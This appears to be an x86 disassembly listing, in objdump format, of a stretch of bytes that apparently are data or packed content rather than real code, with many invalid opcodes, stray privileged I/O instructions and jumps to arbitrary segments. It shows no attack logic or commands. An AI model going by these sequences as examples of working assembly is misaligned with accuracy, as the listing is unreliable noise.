  43ada3:	xor    BYTE PTR [eax-0x4a7fd9e1],bh
  43ada9:	mov    WORD PTR [ebx],cs
  43adab:	sbb    al,0xc2
  43adad:	cmp    dh,0xd3
  43adb0:	mov    dh,0x45
  43adb2:	push   ds
  43adb3:	jg     0x43adae
  43adb5:	dec    esi
  43adb6:	push   ebp
  43adb7:	mov    bh,0x41
  43adb9:	out    0x33,eax
  43adbb:	(bad)  [edx]
  43adbd:	add    esi,DWORD PTR [edx]
  43adbf:	fs inc edi
  43adc1:	test   eax,0x1b1eeb09
  43adc6:	pop    ds
  43adc7:	mov    cl,0xe2
  43adc9:	aad    0x94
  43adcb:	push   DWORD PTR [eax+0x12]
  43adce:	sbb    edx,edi
  43add0:	dec    edx
  43add1:	mov    dh,0x77
  43add3:	mov    ds:0x8a4f735f,eax
  43add8:	mov    cl,ah
  43adda:	pop    esp
  43addb:	arpl   WORD PTR [eax+eiz*8+0x71],dx
  43addf:	xor    ecx,DWORD PTR [ecx+0x71741402]
  43ade5:	xchg   ebx,eax
  43ade6:	push   0x53
  43ade8:	inc    eax
  43ade9:	std    
  43adea:	pop    ds
  43adeb:	and    DWORD PTR [eax],esp
  43aded:	dec    eax
  43adee:	nop
  43adef:	and    BYTE PTR [edx],0xd5
  43adf2:	pop    ebp
  43adf3:	stos   DWORD PTR es:[edi],eax
  43adf4:	add    DWORD PTR [ebx],eax
  43adf6:	or     DWORD PTR [esi+edi*4+0x2],eax
  43adfa:	jmp    0x43ad86
  43adfc:	mov    ebx,DWORD PTR [edx]
  43adfe:	push   ds
  43adff:	int    0xb9
  43ae01:	ret    0x9f38
  43ae04:	loopne 0x43ae48
  43ae06:	mov    edx,esp
  43ae08:	cmovs  ebx,DWORD PTR [ebx+0xa33427d]
  43ae0f:	jg     0x43ae89
  43ae11:	mov    BYTE PTR [edi-0x2d],ah
  43ae14:	int3   
  43ae15:	sub    dh,BYTE PTR [ebp+0x1]
  43ae18:	mov    BYTE PTR [esp+edi*1],ah
  43ae1b:	inc    esi
  43ae1c:	inc    esp
  43ae1d:	add    dl,BYTE PTR [esi]
  43ae1f:	mov    bl,0xd8
  43ae21:	mov    ch,BYTE PTR [ebx+0x1f904b07]
  43ae27:	xor    eax,0xbafcf407
  43ae2c:	clc    
  43ae2d:	dec    DWORD PTR [ebx-0x2b]
  43ae30:	leave  
  43ae31:	sub    BYTE PTR [ebp-0x4a3bf3dd],ah
  43ae37:	dec    esi
  43ae38:	mov    gs,WORD PTR [ebx-0x68]
  43ae3b:	pop    edi
  43ae3c:	or     al,0x2f
  43ae3e:	(bad)  
  43ae3f:	gs sbb al,0x25
  43ae42:	jbe    0x43adfe
  43ae44:	jmp    0x7939:0xc80035a8
  43ae4b:	sub    eax,0xc7afa55d
  43ae50:	out    dx,al
  43ae51:	(bad)  
  43ae52:	loopne 0x43ae20
  43ae54:	pop    ds
  43ae55:	push   0xffffffbc
  43ae57:	inc    ecx
  43ae58:	in     eax,dx
  43ae59:	es mov al,0x1d
  43ae5c:	jecxz  0x43ae8b
  43ae5e:	push   ds
  43ae5f:	sub    eax,0x8c888064
  43ae64:	sti    
  43ae65:	mul    DWORD PTR [ecx+0x59f5f7d4]
  43ae6b:	loopne 0x43ae41
  43ae6d:	sbb    bl,0xd4
  43ae70:	add    al,0xb0
  43ae72:	adc    eax,0x9ca2ac7
  43ae77:	mov    bh,0x88
  43ae79:	sbb    DWORD PTR [esi-0x64],0xffffff8f
  43ae7d:	push   ds
  43ae7e:	and    DWORD PTR [eax+0xc],eax
  43ae81:	add    esp,esp
  43ae83:	xor    ah,cl
  43ae85:	xor    cl,BYTE PTR [esp+ecx*4]
  43ae88:	pop    ss
  43ae89:	and    DWORD PTR [esi],ebx
  43ae8b:	push   ecx
  43ae8c:	cmp    BYTE PTR es:[edi],bh
  43ae8f:	fs test al,0xfe
  43ae92:	xchg   esi,eax
  43ae93:	(bad)  
  43ae94:	rcl    BYTE PTR [edx],cl
  43ae96:	or     al,al
  43ae98:	push   0xcc548f6b
  43ae9d:	xchg   BYTE PTR [eax-0x5d],ah
  43aea0:	add    DWORD PTR [ebp+edx*1-0x12],ebx
  43aea4:	push   esp
  43aea5:	and    ch,BYTE PTR [ebx]
  43aea7:	xlat   BYTE PTR ds:[ebx]
  43aea8:	imul   esi,DWORD PTR [edx-0x3a],0xacd4a44d
  43aeaf:	lahf   
  43aeb0:	scas   al,BYTE PTR es:[edi]
  43aeb1:	sub    esp,ebx
  43aeb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aeb4:	call   0x4263:0x93d5b739
  43aebb:	xchg   edx,eax
  43aebc:	mov    es,WORD PTR [esi+0x58]
  43aebf:	jo     0x43ae57
  43aec1:	or     BYTE PTR [eax],0x78
  43aec4:	lds    eax,FWORD PTR [eax+0x61]
  43aec7:	push   ebp
  43aec8:	mov    ch,0xd0
  43aeca:	call   0x70a537b5
  43aecf:	xchg   DWORD PTR [esp+eax*4],ecx
  43aed2:	ja     0x43af3b
  43aed4:	dec    edx
  43aed5:	add    cl,BYTE PTR [edx-0x4112fb03]
  43aedb:	or     eax,0xdf609529
  43aee0:	push   ss
  43aee1:	shl    BYTE PTR [si-0x2fa4],0x93
  43aee7:	sub    ch,cl
  43aee9:	shl    esp,1
  43aeeb:	push   ebp
  43aeec:	lods   eax,DWORD PTR ds:[esi]
  43aeed:	mov    ch,0xde
  43aeef:	into   
  43aef0:	(bad)  
  43aef1:	fistp  WORD PTR [ebx]
  43aef3:	add    dl,dl
  43aef5:	cmp    eax,0xd165af5b
  43aefa:	test   esi,0x642b0238
  43af00:	addr16 xor al,0x1e
  43af03:	mov    edi,0x622a53b0
  43af08:	mov    esi,0xed5b3e7
  43af0d:	sub    DWORD PTR [esi],esp
  43af0f:	pop    es
  43af10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43af11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43af12:	adc    eax,0x4c81b66d
  43af17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43af18:	pop    ecx
  43af19:	out    dx,eax
  43af1a:	pusha  
  43af1b:	mov    ch,0xff
  43af1d:	fnsave ds:0x162144fb
  43af23:	xlat   BYTE PTR ds:[ebx]
  43af24:	mov    esp,0xbbaadd86
  43af29:	jecxz  0x43af4e
  43af2b:	add    eax,DWORD PTR [esi+0x6d9f7253]
  43af31:	and    eax,0xa0f6c4de
  43af36:	dec    ebp
  43af37:	aam    0xe2
  43af39:	rcr    BYTE PTR [edi-0x1b],cl
  43af3c:	loopne 0x43af28
  43af3e:	cmp    DWORD PTR [edx],ebx
  43af40:	xchg   esp,eax
  43af41:	jne    0x43af7c
  43af43:	daa    
  43af44:	loope  0x43af49
  43af46:	cwde   
  43af47:	sub    al,0x2b
  43af49:	xor    al,0xfe
  43af4b:	pop    esp
  43af4c:	and    DWORD PTR [eax],edx
  43af4e:	loop   0x43af3c
  43af50:	test   al,0x11
  43af52:	push   ds
  43af53:	mov    edx,0xdbb65862
  43af58:	xchg   esp,eax
  43af59:	adc    esp,0xffffff9a
  43af5c:	mov    ebp,0x6c764542
  43af61:	adc    eax,0x4e9d401
  43af66:	pmuludq mm6,QWORD PTR [ecx]
  43af69:	call   0x71d23af6
  43af6e:	mov    ch,0xc6
  43af70:	xor    eax,0xdbb55272
  43af75:	rcl    DWORD PTR [esi],cl
  43af77:	adc    eax,edi
  43af79:	xchg   ah,al
  43af7b:	xchg   edx,eax
  43af7c:	aas    
  43af7d:	call   0xf67e:0x63882686
  43af84:	or     BYTE PTR [ebx],ch
  43af86:	fwait
  43af87:	mov    esi,0x4e7844c7
  43af8c:	push   ds
  43af8d:	add    ebp,DWORD PTR [esi]
  43af8f:	test   al,0xd9
  43af91:	ds jno 0x43af3d
  43af94:	scas   al,BYTE PTR es:[edi]
  43af95:	mov    eax,ds:0x91898dba
  43af9a:	loopne 0x43aff9
  43af9c:	jmp    0x8636:0xbbd578cc
  43afa3:	sbb    BYTE PTR [ebx+0x63],al
  43afa6:	repz fdivr st(5),st
  43afa9:	cdq    
  43afaa:	adc    eax,0xede19dd4
  43afaf:	out    0x3a,al
  43afb1:	cli    
  43afb2:	in     al,0xd4
  43afb4:	ficom  WORD PTR [edx+0x5c]
  43afb7:	in     al,dx
  43afb8:	test   DWORD PTR [esi+0x69941e7d],ebx
  43afbe:	jge    0x43b01f
  43afc0:	mov    bh,0x45
  43afc2:	mov    ?,WORD PTR [eax-0x2a8422e2]
  43afc8:	jo     0x43b03d
  43afca:	nop
  43afcb:	std    
  43afcc:	pushf  
  43afcd:	xor    eax,DWORD PTR [ebp-0x351e770c]
  43afd3:	imul   edx,DWORD PTR [ebx],0xffffff89
  43afd6:	adc    ah,BYTE PTR [edi+0x78]
  43afd9:	sbb    edx,esi
  43afdb:	out    dx,eax
  43afdc:	push   ebx
  43afdd:	ds adc eax,0x1c0123d7
  43afe3:	aam    0x88
  43afe5:	or     DWORD PTR [edx-0x42f7f7e3],esi
  43afeb:	data16 mov dh,0x26
  43afee:	jbe    0x43af83
  43aff0:	loop   0x43afa6
  43aff2:	pop    edi
  43aff3:	and    al,0xb8
  43aff5:	fld    DWORD PTR [edx+0x26]
  43aff8:	mov    DWORD PTR [ecx-0x1320884f],ecx
  43affe:	mov    al,ds:0xfc452211
  43b003:	sbb    esp,DWORD PTR [edi-0x78]
  43b006:	pop    ds
  43b007:	jae    0x43af8b
  43b009:	push   esp
  43b00a:	(bad)  
  43b00b:	jge    0x43b020
  43b00d:	jb     0x43b02d
  43b00f:	aaa    
  43b010:	(bad)
  43b014:	aas    
  43b015:	(bad)  
  43b016:	jl     0x43b05a
  43b018:	dec    eax
  43b019:	jbe    0x43b07c
  43b01b:	jns    0x43afc5
  43b01d:	jl     0x43afc5
  43b01f:	sahf   
  43b020:	push   esp
  43b021:	jecxz  0x43b070
  43b023:	pusha  
  43b024:	mov    DWORD PTR ds:0xfb3b869d,edi
  43b02a:	mov    ch,0x6
  43b02c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b02d:	add    bh,BYTE PTR [esp+ecx*8-0x1be82c11]
  43b034:	stc    
  43b035:	ja     0x43b056
  43b037:	push   ecx
  43b038:	in     eax,0x13
  43b03a:	adc    BYTE PTR [esi+ecx*4+0x5bd49c2a],0x51
  43b042:	adc    DWORD PTR [ecx],eax
  43b044:	or     ebx,0xffffffa4
  43b047:	leave  
  43b048:	push   esp
  43b049:	mov    esp,DWORD PTR [edx+0x53]
  43b04c:	lods   al,BYTE PTR ds:[esi]
  43b04d:	jo     0x43b0b3
  43b04f:	rcr    BYTE PTR [eax-0x4d],1
  43b052:	clc    
  43b053:	push   cs
  43b054:	xchg   ebp,eax
  43b055:	add    bl,BYTE PTR [esi-0x50ea3524]
  43b05b:	pop    esp
  43b05c:	jle    0x43b00b
  43b05e:	pop    DWORD PTR [edx-0x2967b9e8]
  43b064:	push   eax
  43b065:	dec    edi
  43b066:	(bad)  
  43b067:	out    0x5e,eax
  43b069:	mov    eax,ds:0x27ef6e0
  43b06e:	mov    ds:0x4503d15b,al
  43b073:	ficomp WORD PTR ds:0xb9d51fe5
  43b079:	sbb    al,BYTE PTR [edi-0x75]
  43b07c:	test   BYTE PTR [edi],0x30
  43b07f:	sahf   
  43b080:	xchg   ebx,eax
  43b081:	push   ecx
  43b082:	ds push esp
  43b084:	xor    DWORD PTR [eax-0x5243cf2b],ebx
  43b08a:	pop    ds
  43b08b:	adc    ecx,DWORD PTR [ecx+0x5e]
  43b08e:	inc    esi
  43b08f:	pop    esp
  43b090:	and    BYTE PTR [ecx+0xa],bl
  43b093:	xlat   BYTE PTR ds:[ebx]
  43b094:	pop    ecx
  43b095:	pushf  
  43b096:	xor    eax,0xa7a4a2f8
  43b09b:	pushf  
  43b09c:	jmp    DWORD PTR [edi-0x54]
  43b09f:	aam    0x71
  43b0a1:	jo     0x43b0aa
  43b0a3:	sar    DWORD PTR [edx],0xab
  43b0a6:	aas    
  43b0a7:	aam    0x95
  43b0a9:	gs jmpw 0x9f3b
  43b0ae:	das    
  43b0af:	in     eax,dx
  43b0b0:	mov    BYTE PTR [ebp-0x68],cl
  43b0b3:	out    dx,al
  43b0b4:	mov    ax,ds:0x2063217
  43b0ba:	fs in  al,dx
  43b0bc:	mov    dl,0xc8
  43b0be:	push   ebx
  43b0bf:	jecxz  0x43b071
  43b0c1:	cmp    BYTE PTR [esi],bl
  43b0c3:	adc    eax,0x1eb4b59a
  43b0c8:	rol    DWORD PTR [esi],1
  43b0ca:	inc    ebx
  43b0cb:	pop    ebp
  43b0cc:	mov    WORD PTR [edi],ds
  43b0ce:	sub    bh,BYTE PTR gs:[edi+0x597c55ad]
  43b0d5:	mov    DWORD PTR [eax+0x12c7f12e],ecx
  43b0db:	inc    ebx
  43b0dc:	cmp    al,BYTE PTR [ebp+0x44]
  43b0df:	fisttp WORD PTR [eax]
  43b0e1:	add    DWORD PTR [eax-0xf],ecx
  43b0e4:	or     al,0x1c
  43b0e6:	test   eax,0xf2b44452
  43b0eb:	mov    ebp,0xc7332728
  43b0f0:	xchg   esi,eax
  43b0f1:	imul   ebx,DWORD PTR [edi+0x4],0x64
  43b0f5:	add    bl,BYTE PTR [esi+esi*1+0x44]
  43b0f9:	pusha  
  43b0fa:	aam    0xd5
  43b0fc:	loope  0x43b16b
  43b0fe:	cld    
  43b0ff:	mov    bl,0xdf
  43b101:	js     0x43b0fd
  43b103:	cdq    
  43b104:	(bad)  
  43b105:	aaa    
  43b106:	add    BYTE PTR [ebx],al
  43b108:	dec    edx
  43b109:	push   edi
  43b10a:	dec    edi
  43b10b:	xor    al,0x34
  43b10d:	test   eax,0x7f1cd4ce
  43b112:	ss inc ecx
  43b114:	icebp  
  43b115:	inc    esi
  43b116:	push   0x323e64b7
  43b11b:	lahf   
  43b11c:	mov    DWORD PTR [ebx+0xe],edi
  43b11f:	jmp    0x4739:0xb22987ca
  43b126:	dec    esp
  43b127:	fcomi  st,st(5)
  43b129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b12a:	fcmovbe st,st(2)
  43b12c:	leave  
  43b12d:	xchg   edx,eax
  43b12e:	inc    esp
  43b12f:	xchg   ecx,eax
  43b130:	mov    al,ds:0x63956c8f
  43b135:	mov    al,ds:0x2297412
  43b13a:	dec    edx
  43b13b:	shr    DWORD PTR [ecx+0x15],1
  43b13e:	imul   esi,DWORD PTR [ebp-0x68e07aec],0x5c
  43b145:	aam    0xc3
  43b147:	xor    BYTE PTR [edi+0x13467319],0xfa
  43b14e:	pop    ecx
  43b14f:	popa   
  43b150:	mov    al,BYTE PTR [edx-0x2f47c939]
  43b156:	pop    esp
  43b157:	add    eax,0x622d5f8d
  43b15c:	xchg   edi,eax
  43b15d:	jl     0x43b0f6
  43b15f:	adc    al,0x96
  43b161:	dec    ecx
  43b162:	sti    
  43b163:	aad    0xbd
  43b165:	push   edx
  43b166:	jns    0x43b1d1
  43b168:	mov    dh,0xe9
  43b16a:	jmp    0x43b156
  43b16c:	mov    BYTE PTR [edi+0x35c7c210],bh
  43b172:	(bad)  
  43b173:	push   cs
  43b174:	xlat   BYTE PTR ds:[ebx]
  43b175:	add    eax,0xf6c23f08
  43b17a:	jmp    0x39:0x1e18b026
  43b181:	add    BYTE PTR [ecx-0x15e65819],0xc7
  43b188:	js     0x43b18d
  43b18a:	neg    BYTE PTR [esp+esi*2-0x3a665de0]
  43b191:	jb     0x43b1b2
  43b193:	push   edi
  43b194:	loope  0x43b1bd
  43b196:	shr    BYTE PTR [esi+0x433c8a1b],1
  43b19c:	scas   al,BYTE PTR es:[edi]
  43b19d:	lods   al,BYTE PTR ds:[esi]
  43b19e:	pusha  
  43b19f:	xor    eax,0x6721a49c
  43b1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b1a5:	scas   al,BYTE PTR es:[edi]
  43b1a6:	lahf   
  43b1a7:	cmp    al,0xd2
  43b1a9:	and    edi,ebx
  43b1ab:	imul   esp,DWORD PTR [ebx],0xdcb2181d
  43b1b1:	jns    0x43b1cc
  43b1b3:	stc    
  43b1b4:	or     bl,bl
  43b1b6:	pop    ss
  43b1b7:	dec    ebp
  43b1b8:	mov    BYTE PTR [edi-0x64],bl
  43b1bb:	shl    DWORD PTR [ebp-0x28b74254],0x5
  43b1c2:	ins    BYTE PTR es:[edi],dx
  43b1c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b1c4:	sub    dl,dl
  43b1c6:	aaa    
  43b1c7:	jl     0x43b204
  43b1c9:	enter  0xf1f,0xf3
  43b1cd:	(bad)  
  43b1ce:	xchg   esp,eax
  43b1cf:	ja     0x43b1c1
  43b1d1:	rcl    BYTE PTR [edi],0xbb
  43b1d4:	push   edx
  43b1d5:	ins    BYTE PTR es:[edi],dx
  43b1d6:	mov    ebp,0xfd5dccd1
  43b1db:	test   BYTE PTR [edx],cl
  43b1dd:	inc    eax
  43b1de:	cdq    
  43b1df:	and    al,0x37
  43b1e1:	inc    ebx
  43b1e2:	ins    DWORD PTR es:[edi],dx
  43b1e3:	add    edx,eax
  43b1e5:	mov    esp,0x3969d604
  43b1ea:	and    eax,0xb205c7d5
  43b1ef:	xor    al,al
  43b1f1:	jo     0x43b186
  43b1f3:	fmul   DWORD PTR [esi+0x4e8966f0]
  43b1f9:	test   ch,al
  43b1fb:	(bad)  
  43b1fd:	and    ch,BYTE PTR [ecx]
  43b1ff:	add    edi,edi
  43b201:	add    ch,BYTE PTR [edx+0x71b9dac2]
  43b207:	xchg   esp,eax
  43b208:	daa    
  43b209:	lea    esp,[ebp-0x49]
  43b20c:	imul   edi,DWORD PTR [ebp+ebp*4-0x14],0xf0e942b1
  43b214:	mov    al,0x5
  43b216:	faddp  st(4),st
  43b218:	sti    
  43b219:	fidiv  WORD PTR [edi+0x7c]
  43b21c:	aaa    
  43b21d:	sbb    DWORD PTR [edi+0xce18820],edi
  43b223:	pop    ebp
  43b224:	jg     0x43b232
  43b226:	hlt    
  43b227:	aaa    
  43b228:	pop    ds
  43b229:	add    ch,BYTE PTR [ecx+edx*2-0x5229f51e]
  43b230:	inc    ebp
  43b231:	shl    BYTE PTR [eax-0x4b],1
  43b234:	push   ebp
  43b235:	popa   
  43b236:	data16 jb 0x43b1c1
  43b239:	and    BYTE PTR [ebp-0x2b],ah
  43b23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b23d:	push   edi
  43b23e:	sbb    eax,0x91280cc0
  43b243:	in     al,0x88
  43b245:	mov    ds:0xd750d882,eax
  43b24a:	mov    ds:0xd20339be,eax
  43b24f:	imul   ecx,DWORD PTR [esi+eiz*8-0x21b32feb],0x6a
  43b257:	jnp    0x43b254
  43b259:	mov    dl,0x47
  43b25b:	imul   ecx,DWORD PTR [eax-0x5b1799ea],0x6889d5f4
  43b265:	in     eax,dx
  43b266:	dec    esi
  43b267:	aam    0x63
  43b269:	stos   BYTE PTR es:[edi],al
  43b26a:	jne    0x43b20c
  43b26c:	jb     0x43b20e
  43b26e:	pop    ds
  43b26f:	and    eax,DWORD PTR [ecx+0x6d]
  43b272:	outs   dx,DWORD PTR ds:[esi]
  43b273:	(bad)  
  43b274:	test   BYTE PTR [esi],bh
  43b276:	mov    bh,0xab
  43b278:	inc    esp
  43b279:	inc    edx
  43b27a:	sbb    ch,BYTE PTR [esi]
  43b27c:	push   esp
  43b27d:	sub    DWORD PTR ds:0x6009584e,0xffffffd1
  43b284:	out    dx,al
  43b285:	mov    ds:0x69084d37,eax
  43b28a:	adc    edx,esp
  43b28c:	popa   
  43b28d:	fs push ss
  43b28f:	xlat   BYTE PTR ds:[ebx]
  43b290:	sti    
  43b291:	jnp    0x43b251
  43b293:	in     eax,0xb6
  43b295:	fldl2e 
  43b297:	cmp    DWORD PTR [ecx],ecx
  43b299:	inc    ecx
  43b29a:	xchg   esi,eax
  43b29b:	retf   0xca8a
  43b29e:	(bad)  
  43b29f:	aad    0x8d
  43b2a1:	pop    ecx
  43b2a2:	pop    ebp
  43b2a3:	mov    ebx,0x62d39c23
  43b2a8:	mov    DWORD PTR [edi+0x60f977ad],eax
  43b2ae:	and    DWORD PTR [ecx],edi
  43b2b0:	sub    BYTE PTR [edx],al
  43b2b2:	clc    
  43b2b3:	mov    bh,BYTE PTR [ebp+0x69]
  43b2b6:	mov    al,0x3d
  43b2b8:	in     al,dx
  43b2b9:	xchg   BYTE PTR [eax-0x35],ah
  43b2bc:	fnstsw WORD PTR [esi+eax*1+0x36053e7c]
  43b2c3:	xchg   ebp,eax
  43b2c4:	pop    ecx
  43b2c5:	aas    
  43b2c6:	push   esp
  43b2c7:	aam    0x1b
  43b2c9:	xor    eax,0xea9e9bd9
  43b2ce:	pop    ds
  43b2cf:	mov    edi,0xcfbacebd
  43b2d4:	and    BYTE PTR [eax+0x6b4fd4b3],dh
  43b2da:	out    dx,al
  43b2db:	cmp    eax,0xe14c194a
  43b2e0:	mov    WORD PTR [ebx+0x2d3368c4],gs
  43b2e6:	jo     0x43b2bc
  43b2e8:	sub    dh,ch
  43b2ea:	fadd   DWORD PTR [esi]
  43b2ec:	jne    0x43b2f1
  43b2ee:	ficomp WORD PTR [edx]
  43b2f0:	jecxz  0x43b2a1
  43b2f2:	push   ecx
  43b2f3:	loope  0x43b2f4
  43b2f5:	mov    ds:0x188dc1c,eax
  43b2fa:	xchg   DWORD PTR [edx+ebp*8-0x2c],edx
  43b2fe:	cmp    ebx,DWORD PTR [esi-0x48]
  43b301:	add    eax,0x2906d4c
  43b306:	aaa    
  43b307:	mov    edx,0x6966b873
  43b30c:	and    al,0x43
  43b30e:	jns    0x43b36d
  43b310:	test   DWORD PTR [edx],eax
  43b312:	pop    ebp
  43b313:	lods   eax,DWORD PTR ds:[esi]
  43b314:	sub    DWORD PTR [ebx],eax
  43b316:	add    cl,BYTE PTR ds:0x8b0141dd
  43b31c:	call   0x3cdd19bb
  43b321:	or     al,0x12
  43b323:	xchg   ecx,eax
  43b324:	pop    eax
  43b325:	xchg   ebx,eax
  43b326:	push   0x1b
  43b328:	fadd   DWORD PTR [edx]
  43b32a:	mov    dl,0xf4
  43b32c:	sub    DWORD PTR [edi+0x661c324d],edi
  43b332:	jge    0x43b359
  43b334:	and    DWORD PTR [ebp-0x1a],0xd1d99d95
  43b33b:	fist   WORD PTR [ebx-0x57103fe]
  43b341:	outs   dx,DWORD PTR ds:[esi]
  43b342:	ins    BYTE PTR es:[edi],dx
  43b343:	inc    ecx
  43b344:	or     BYTE PTR [eax-0x50dcd8e1],0x98
  43b34b:	cmp    eax,DWORD PTR [esi+0x1]
  43b34e:	test   ch,dl
  43b350:	or     eax,DWORD PTR [esp+eiz*4+0x26]
  43b354:	cmp    BYTE PTR [edx+0x7b88a9ea],al
  43b35a:	xchg   BYTE PTR [edx],dh
  43b35c:	or     al,0x87
  43b35e:	xchg   edx,eax
  43b35f:	jg     0x43b348
  43b361:	adc    BYTE PTR [edx],bh
  43b363:	(bad)  
  43b364:	fsubrp st(5),st
  43b366:	outs   dx,BYTE PTR ds:[esi]
  43b367:	mov    edx,0x2dc6c329
  43b36c:	stos   BYTE PTR es:[edi],al
  43b36d:	sub    al,BYTE PTR ds:0x1f527400
  43b373:	xlat   BYTE PTR ds:[ebx]
  43b374:	out    0xa8,al
  43b376:	mov    bh,0x15
  43b378:	push   es
  43b379:	xor    eax,ebp
  43b37b:	aam    0x72
  43b37d:	out    0xe4,al
  43b37f:	push   esp
  43b380:	mov    al,0x2c
  43b382:	inc    ebx
  43b383:	dec    DWORD PTR [eax+0x75522f4b]
  43b389:	cmp    cl,BYTE PTR [esi]
  43b38b:	retf   
  43b38c:	cmp    bl,BYTE PTR [ecx]
  43b38e:	lods   al,BYTE PTR ds:[esi]
  43b38f:	jp     0x43b3a1
  43b391:	jecxz  0x43b33d
  43b393:	aam    0xec
  43b395:	or     BYTE PTR ds:0x5bf01ac0,dh
  43b39b:	push   ebp
  43b39c:	xchg   ebp,eax
  43b39d:	dec    esp
  43b39e:	pop    ds
  43b39f:	mov    ebp,es
  43b3a1:	adc    BYTE PTR [eax-0x75fcda65],al
  43b3a7:	shr    DWORD PTR [eax+eax*4+0x62],cl
  43b3ab:	imul   esi,DWORD PTR [ecx],0x33
  43b3ae:	pop    ds
  43b3af:	addr16 out 0x95,al
  43b3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b3b3:	mov    edi,0xd7455008
  43b3b8:	mov    ah,ch
  43b3ba:	aam    0xd2
  43b3bc:	inc    edi
  43b3be:	push   esi
  43b3bf:	int    0x8d
  43b3c1:	arpl   WORD PTR [edi],bx
  43b3c3:	mov    ecx,0x50b33e8e
  43b3c8:	adc    bl,ah
  43b3ca:	sub    bh,dl
  43b3cc:	sbb    esi,DWORD PTR [edx+0x7f923f08]
  43b3d2:	fstp   QWORD PTR [edi-0x59007a]
  43b3d8:	inc    edx
  43b3d9:	adc    eax,0xe8d48bbe
  43b3de:	int    0xd4
  43b3e0:	pop    edx
  43b3e1:	push   ds
  43b3e2:	jecxz  0x43b38d
  43b3e4:	xchg   edi,eax
  43b3e5:	xor    ah,BYTE PTR [esi-0x7c]
  43b3e8:	mov    BYTE PTR [ecx-0x3ed43c35],ch
  43b3ee:	push   edi
  43b3ef:	mov    ebp,0x6c8802a4
  43b3f4:	inc    ebx
  43b3f5:	in     eax,dx
  43b3f6:	out    0x4f,al
  43b3f8:	rcl    dh,cl
  43b3fa:	pusha  
  43b3fb:	push   ebp
  43b3fc:	add    ecx,DWORD PTR [ecx-0x18d5c9b1]
  43b402:	jo     0x43b3d9
  43b404:	sbb    eax,0x56979e1f
  43b409:	dec    esp
  43b40a:	out    0x97,eax
  43b40c:	aam    0xe3
  43b40e:	fild   QWORD PTR [eax+0x2093b78b]
  43b414:	sub    eax,0xbe09bf28
  43b419:	stc    
  43b41a:	mov    dh,0x75
  43b41c:	inc    ebp
  43b41d:	add    esi,edx
  43b41f:	cmp    ebp,edx
  43b421:	mov    al,0xd2
  43b423:	popa   
  43b424:	mov    ds:0xbb887a30,al
  43b42a:	inc    eax
  43b42b:	inc    esi
  43b42c:	imul   ebp,DWORD PTR [edi],0x32fab62
  43b432:	cmp    bh,BYTE PTR [ebx]
  43b434:	mov    ch,0x3b
  43b436:	xlat   BYTE PTR ds:[ebx]
  43b437:	jmp    FWORD PTR [ecx+eiz*4+0x7eb1f1f]
  43b43e:	scas   eax,DWORD PTR es:[edi]
  43b43f:	adc    DWORD PTR [esi],0x42
  43b442:	sub    dl,dl
  43b444:	xchg   ebp,eax
  43b445:	sbb    ebp,DWORD PTR [edi+0x3f]
  43b448:	inc    edx
  43b449:	and    BYTE PTR [eax],0x77
  43b44c:	pop    eax
  43b44d:	sbb    ebx,DWORD PTR [esi]
  43b44f:	ja     0x43b404
  43b451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b452:	jb     0x43b4a6
  43b454:	cmp    DWORD PTR [edi-0x18],eax
  43b457:	pop    edx
  43b458:	mov    dh,0x66
  43b45a:	pusha  
  43b45b:	lea    ecx,[edi+0x3e]
  43b45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b45f:	push   edi
  43b460:	fidiv  DWORD PTR ds:[eax+0x48ff8958]
  43b467:	push   0x3
  43b469:	shl    eax,1
  43b46b:	aaa    
  43b46c:	scas   al,BYTE PTR es:[edi]
  43b46d:	adc    BYTE PTR [ebx+esi*2],dl
  43b470:	dec    ebp
  43b471:	loop   0x43b492
  43b473:	push   esp
  43b474:	cli    
  43b475:	add    DWORD PTR ds:0x909888f,edi
  43b47b:	push   esp
  43b47c:	lahf   
  43b47d:	xor    DWORD PTR [ebx],esp
  43b47f:	ret    
  43b480:	clc    
  43b481:	gs jmp 0x43b42f
  43b484:	outs   dx,BYTE PTR ds:[esi]
  43b485:	adc    al,0x63
  43b487:	stc    
  43b488:	std    
  43b489:	(bad)  
  43b48a:	fucomip st,st(0)
  43b48c:	pop    ebp
  43b48d:	mov    ch,BYTE PTR [ebp-0x15]
  43b490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b491:	or     BYTE PTR [esi-0x60f55597],al
  43b497:	js     0x43b479
  43b499:	retf   
  43b49a:	(bad)  
  43b49c:	neg    DWORD PTR [edi-0xe9a679b]
  43b4a2:	xor    ebp,DWORD PTR [edi-0x1b3e9e6a]
  43b4a8:	pusha  
  43b4a9:	add    DWORD PTR [ecx-0xe650f5],edx
  43b4af:	inc    eax
  43b4b0:	mov    ebx,0x60c9f873
  43b4b5:	add    ecx,esi
  43b4b7:	xchg   esi,eax
  43b4b8:	xchg   ecx,eax
  43b4b9:	add    bl,0x16
  43b4bc:	push   esi
  43b4bd:	xor    al,0x1e
  43b4bf:	mov    ebp,0xd7aaa784
  43b4c4:	inc    eax
  43b4c5:	mov    edx,ebp
  43b4c7:	aad    0x18
  43b4c9:	mov    dl,0xd8
  43b4cb:	dec    edi
  43b4cc:	retf   
  43b4cd:	test   BYTE PTR [eax+0x31138adf],dl
  43b4d3:	ds jo  0x43b4a8
  43b4d6:	sub    al,dl
  43b4d8:	movnti DWORD PTR [esi-0x33fa0d40],esi
  43b4df:	test   edx,0x2f07e52f
  43b4e5:	(bad)  
  43b4e6:	pop    ds
  43b4e7:	sbb    eax,0xcd7dfe3d
  43b4ec:	dec    esi
  43b4ed:	js     0x43b491
  43b4ef:	aam    0x84
  43b4f1:	loopne 0x43b52f
  43b4f3:	dec    DWORD PTR [ecx+eax*1-0x73]
  43b4f7:	jl     0x43b481
  43b4f9:	aad    0xf9
  43b4fb:	jp     0x43b55f
  43b4fd:	pop    edi
  43b4fe:	inc    edx
